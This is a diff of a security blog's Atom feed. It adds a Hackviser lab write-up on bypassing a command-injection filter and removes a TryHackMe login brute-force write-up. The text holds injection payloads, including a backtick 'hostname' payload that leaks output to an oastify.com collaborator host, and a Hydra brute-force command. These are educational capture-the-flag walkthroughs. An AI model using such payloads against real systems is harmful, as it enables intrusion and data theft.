@@ -3,12 +3,107 @@
     <title>Offens!ve Blogs - Sakibul Ali Khan</title>
     <link href="https://sakibulalikhan.pages.dev/feed.xml" rel="self" />
     <link href="https://sakibulalikhan.pages.dev" />
-    <updated>2024-02-22T04:48:27+06:00</updated>
+    <updated>2024-02-29T17:13:47+06:00</updated>
     <author>
         <name>Sakibul Ali Khan</name>
     </author>
     <id>https://sakibulalikhan.pages.dev</id>
 
+    <entry>
+        <title>Hackviser - Command Injection Filter Bypass</title>
+        <author>
+            <name>Sakibul Ali Khan</name>
+        </author>
+        <link href="https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html"/>
+        <id>https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html</id>
+        <media:content url="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" medium="image" />
+            <category term="Web Security"/>
+            <category term="Pentesting"/>
+            <category term="OWASP 10"/>
+            <category term="Hackviser"/>
+            <category term="Command Injection"/>
+            <category term="CTF Writeups"/>
+
+        <updated>2024-02-29T17:13:36+06:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" alt="Hackviser - Command Injection Filter Bypass" />
+                    Command Injection Filter Bypass: This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" class="type:primaryImage" alt="Hackviser - Command Injection Filter Bypass" /></p>
+                <h2 class="MuiBox-root css-lxebfo"><span class="MuiTypography-root MuiTypography-normalBold css-1r2482o">Command Injection Filter Bypass:</span></h2>
+<div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
+<div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+<div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+<div> </div>
+<div class="MuiBox-root css-18puooo"><span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);">This lab contains a Command Injection vulnerability that leads to remote command execution.</span></div>
+<div class="MuiBox-root css-1c8mvc2">
+<div class="MuiBox-root css-1v8my8o">
+<p>The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains common commands or operators, your query will be blocked. Find a way to run a command on the system.</p>
+<h4>What is the hostname address of the server where the website is running?</h4>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection_filter_bypass.png" alt="Hackviser - Command Injection Filter Bypass" width="1356" height="423" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-lg.png 1024w"></figure>
+<div class="MuiBox-root css-lxebfo">
+<div class="cl-preview-section">
+<h3>What is OS Command Injection?</h3>
+</div>
+<div class="cl-preview-section">
+<p>OS Command Injection represents a vulnerability wherein attackers can run arbitrary commands on the underlying operating system by manipulating user-provided input passed to system shell commands. This vulnerability emerges when web applications directly integrate user input into command strings sans adequate validation or sanitization.</p>
+</div>
+<div class="cl-preview-section">
+<h3>Impact of OS Command Injection</h3>
+</div>
+<div class="cl-preview-section">
+<p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>
+</div>
+</div>
+<div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
+<div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+<div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+<div class="MuiBox-root css-1c8mvc2"> </div>
+</div>
+</div>
+</div>
+<p>Read more: <a href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice" title="Exploring OS Command Injection: Understanding and Hands-On Practice">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>
+<p>Let's begin the journey to solve the challenge. Start by visiting the website, which includes a DNS Lookup feature. Enter any domain name, and it will provide DNS records for that domain.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection0.png" alt="Hackviser - Command Injection Filter Bypass" width="1193" height="451" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-lg.png 1024w"></figure>
+<p>I tested the website's functionality by entering Google's domain and received DNS information about the domain.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection1.png" alt="Hackviser - Command Injection Filter Bypass" width="1250" height="717" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-lg.png 1024w"></figure>
+<p><strong>Now time to work on exploit the app with Command Injection, Let's do it....</strong></p>
+<p>Now, let's work on exploiting the app with Command Injection. I attempted a basic Command Injection payload, using <code>;ls</code> appended to the domain name in the input field and clicked the search button to see if it worked.</p>
+<p>Payload: </p>
+<pre class="language-bash line-numbers"><code>google.com;ls</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection2.png" alt="Hackviser - Command Injection Filter Bypass" width="1159" height="527" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-lg.png 1024w"></figure>
+<p>However, an error occurred due to blacklisted keywords. To execute Command Injection, we need to bypass this restriction. After several failed attempts, I revisited the machine intro and realized that "nslookup" was running in the background, hinting at the possibility of Blind Command Injection.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection3-2.png" alt="Hackviser - Command Injection Filter Bypass" width="1367" height="417" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-lg.png 1024w"></figure>
+<p>Now, you need to spin-up your BurpSuite Pro. Yes, you need to use the premium version of BurpSuite for further steps.</p>
+<p>In your BurpSuite Pro, go to Collaborator, located on the top bar. Then, click the "Get Started" button below.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection4.png" alt="Hackviser - Command Injection Filter Bypass" width="1213" height="568" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-lg.png 1024w"></figure>
+<p>After doing that, you can find the "Copy to clipboard" option. Click there, and a URL will be copied to your clipboard.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection5.png" alt="Hackviser - Command Injection Filter Bypass" width="1267" height="626" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-lg.png 1024w"></figure>
+<p>Now, we need to manipulate a payload to test Blind Command Injection on the website. To do this, we use backquotes <code>`</code> to bypass the blacklisted keyword. Inside the backquote, we use the <code>hostname</code> command to identify the hostname of the machine.</p>
+<p>Payload:</p>
+<pre class="language-bash line-numbers"><code>`hostname`.ezh05yiz9aqt010ugvzaq9dt7kdb12pr.oastify.com</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection6.png" alt="Hackviser - Command Injection Filter Bypass" width="1266" height="898" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-lg.png 1024w"></figure>
+<p>Our persistence paid off, and the payload executed. However, the output only showed DNS information. Suspecting Blind Command Injection, I went back to the BurpSuite Collaborator tab and clicked the "<strong>Poll now</strong>" button to check for a response from the challenge machine.</p>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection7.png" alt="Hackviser - Command Injection Filter Bypass" width="1376" height="849" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-lg.png 1024w"></figure>
+<p>In the response, a subdomain appeared, indicating the output of the hostname command. I copied this information before the "<code>.</code>", and that was our machine challenge answer.</p>
+<p>Answer:</p>
+<pre class="language-bash line-numbers"><code>LEgeNd</code></pre>
+<figure class="post__image"><img loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection8.png" alt="Hackviser - Command Injection Filter Bypass" width="1334" height="410" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-lg.png 1024w"></figure>
+<p>Hooray! We successfully navigated the Command Injection Filter Bypass challenge on Hackviser.</p>
+<h2>Conclusion:</h2>
+<p>This lab journey illuminated the nuances of Command Injection vulnerabilities, highlighting the critical importance of input validation and bypass techniques. As we navigated through the challenge on Hackviser, encountering obstacles such as blacklisted keywords and blind injection, we honed our skills in crafting payloads and leveraging tools like BurpSuite Pro. Despite setbacks, persistence paid off as we uncovered the elusive hostname address through collaborative efforts. This experience underscores the necessity for robust security practices in web development and the value of continuous learning in fortifying against cyber threats. With each challenge conquered, we strengthen our defenses and advance our expertise in securing digital landscapes. Congratulations on overcoming the Command Injection Filter Bypass challenge on Hackviser!</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Hackviser - Basic Command Injection Writeup</title>
         <author>
@@ -20,10 +115,11 @@
             <category term="Web Security"/>
             <category term="Pentesting"/>
             <category term="OWASP 10"/>
+            <category term="Hackviser"/>
             <category term="Command Injection"/>
             <category term="CTF Writeups"/>
 
-        <updated>2024-02-22T04:48:27+06:00</updated>
+        <updated>2024-02-29T17:13:47+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/24/Hackviser-Basic-Command-Injection-Writeup-2.png" alt="Hackviser - Basic Command Injection Writeup" />
@@ -57,6 +153,7 @@
 </div>
 <div class="cl-preview-section">
 <p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>
+<p>Read more: <a href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice" title="Exploring OS Command Injection: Understanding and Hands-On Practice">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>
 </div>
 </div>
 <div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
@@ -1936,117 +2033,6 @@ cd PentestGPT
 <p id="af19" class="pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj" data-selectable-paragraph="">And there you have it! We successfully decrypted Groot’s message and unveiled the hidden flag. The mini_RSA challenge provided a beginner-friendly introduction to RSA encryption and the importance of securely generating key pairs.</p>
 <p id="54a6" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph="">Feel free to explore the provided scripts and experiment with different RSA concepts to deepen your understanding of cryptography. Happy hacking, and may the challenges keep coming!</p>
 <p id="53aa" class="pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj" data-selectable-paragraph=""><em class="ams">Written by sakibulalikhan of </em><a class="af os" href="https://ctftime.org/team/188318" rel="noopener ugc nofollow" target="_blank"><em class="ams">HiddenInvestigations</em></a><em class="ams"> for BackdoorCTF 2023.</em></p>
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>Capture TryHackMe Writeup</title>
-        <author>
-            <name>Sakibul Ali Khan</name>
-        </author>
-        <link href="https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html"/>
-        <id>https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html</id>
-        <media:content url="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" medium="image" />
-            <category term="Web Security"/>
-            <category term="TryHackMe"/>
-            <category term="Python"/>
-            <category term="Pentesting"/>
-            <category term="Offensive Programming"/>
-            <category term="Hacking Tools"/>
-            <category term="CTF Writeups"/>
-
-        <updated>2024-01-29T16:26:18+06:00</updated>
-            <summary>
-                <![CDATA[
-                        <img src="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" alt="Capture TryHackMe Writeup" />
-                    SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application&hellip;
-                ]]>
-            </summary>
-        <content type="html">
-            <![CDATA[
-                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png" class="type:primaryImage" alt="Capture TryHackMe Writeup" /></p>
-                <div class="post__entry">
-<p id="c45e" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly<strong class="lk fp">.</strong></p>
-<p id="5273" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj"><strong>Difficulty = </strong>Easy</p>
-<p id="3b4f" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj"><strong class="lk fp">Challenges: </strong><span class="lk fp">Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</span></p>
-<p id="014c" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af nj" href="https://tryhackme.com/room/capture" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/capture</a></p>
-<p id="fb69" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj nk dropcap" data-selectable-paragraph=""><span class="l nl nm nn bn no np nq nr ns eb">W</span>ell, In Task 1 we got some general information and a task file that contains a list of usernames and a list with passwords.</p>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky nt">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*xlAzpuvtgclCW3WlMwogXg.png" alt="Capture Capture TryHackMe Writeup" width="700" height="379" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="70dd" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Now let’s start the application and load up the main page to see what’s going on.</p>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky nt">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*9Fli7uwoSUcRsXtVkG8Erg.png" alt="Capture TryHackMe Writeup" width="700" height="178" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="c319" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Loading up the main website <a class="af nj" href="http://machine_ip/" rel="noopener ugc nofollow" target="_blank"><strong class="lk fp">http://MACHINE_IP</strong></a>, we can see an “Intranet login” page.</p>
-<p id="0a65" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">With the passwords and usernames list we have it’s safe to assume this will be a brute-force attack.</p>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky od">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*iVc2rJVegHTG4Awrbe5xnA.png" alt="Capture TryHackMe Writeup" width="700" height="173" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="311d" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">So we’re supposed to beat the self-made rate limiter. Checking the request in Burp doesn’t show any header related to the rate limit. Let’s spin up Hydra.</p>
-<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="9679" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">sudo hydra -L usernames.txt -P passwords.txt 10.10.22.8 http-post-form <span class="hljs-string">"/login:username=^USER^&amp;password=^PASS^:Error"</span> -v -t 40</span></pre>
-<p id="4706" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">This returns without any results, I checked the website again and I got a <strong class="lk fp">Captcha Enabled</strong> message showing up with a Captcha to solve.</p>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky on">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*fVvF-OiskmCOUrlAqlCuCA.png" alt="Capture TryHackMe Writeup" width="700" height="251" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="2622" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">This captcha is simple to beat. We have to write a Python script that requests the page, solves the captcha, and posts the data with the correct captcha.</p>
-<p id="b104" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">To ease your task, I made a full-featured Python tool. you can use that to solve this room. For automation, you can use that. <strong class="lk fp">But strongly recommend that you review my code to understand how the script works.</strong></p>
-<h3 id="ea79" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj">Exploitation Part:</h3>
-<p id="6f74" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj" data-selectable-paragraph="">Open your <em>terminal</em> and clone this repository to your device.</p>
-<div class="oo op oq or os ot">
-<div class="ou ab hm">
-<div class="ov ab cn ca ow ox">
-<h6 class="be fp hj z oy oz pa pb pc pd pe fn bj"><a href="https://github.com/sakibulalikhan/thm-capture" target="_blank" rel="noopener noreferrer">GitHub Repo Link</a></h6>
-</div>
-</div>
-</div>
-<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="88e7" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">git <span class="hljs-built_in">clone</span> https://github.com/sakibulalikhan/thm-capture</span></pre>
-<p id="69b9" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Then enter the folder and install the requirements.</p>
-<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="0396" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph=""><span class="hljs-built_in">cd</span> thm-capture<br>pip install -r requirements.txt</span></pre>
-<p id="48b7" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Now time to exploit! For exploitation, you just use the<em> “-t” flag</em> to specify the target, and after ‘-t’ enter the URL and wait for it to finish the task. This tool also provides you with the flag!!!!!! Are you serious? yes, yes.</p>
-<pre class="nu nv nw nx ny oe of og bo oh ba bj"><span id="9fa0" class="oi mh fo of b bf oj ok l ol om" data-selectable-paragraph="">python capture.py -t <span class="hljs-variable">$IP</span><br><br>Example: python capture.py -t 10.10.22.8</span></pre>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky pn">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*oOJY6QJ9LEuIigHQVLdC5Q.png" alt="Capture TryHackMe Writeup" width="700" height="592" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p id="3edd" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">Isn’t it amazing? You got a <strong>username</strong>, <strong>password</strong>, and <strong>precious flag!!!!!</strong><br>The results are there, but you’ll have to find them yourself!</p>
-<figure class="nu nv nw nx ny lf kx ky paragraph-image">
-<div class="nz oa eb ob bg oc" tabindex="0" role="button">
-<div class="kx ky po">
-<figure class="bg lg lh c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:700/1*q9mQ7R9azkbCGxsPTcHDAA.png" alt="Capture TryHackMe Writeup" width="700" height="482" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
-</div>
-</div>
-</figure>
-<p data-selectable-paragraph="">You can check this links:</p>
-<ul>
-<li><a href="https://github.com/sakibulalikhan/thm-capture">https://github.com/sakibulalikhan/thm-capture</a></li>
-<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages" target="_blank" rel="noopener noreferrer">OWASP Authentication Cheat Sheet</a></li>
-<li><a href="https://requests.readthedocs.io/en/latest/user/quickstart/" target="_blank" rel="noopener noreferrer">Quickstart Python Requests</a></li>
-<li><a href="https://pythex.org/">https://pythex.org/</a></li>
-</ul>
-<p id="98e4" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Thanks for Reading!!</strong></p>
-<p id="cf24" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Follow me on Twitter</strong>: <a class="af nj" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
-<p id="183c" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Happy Capture~</strong></p>
-</div>
             ]]>
         </content>
     </entry>
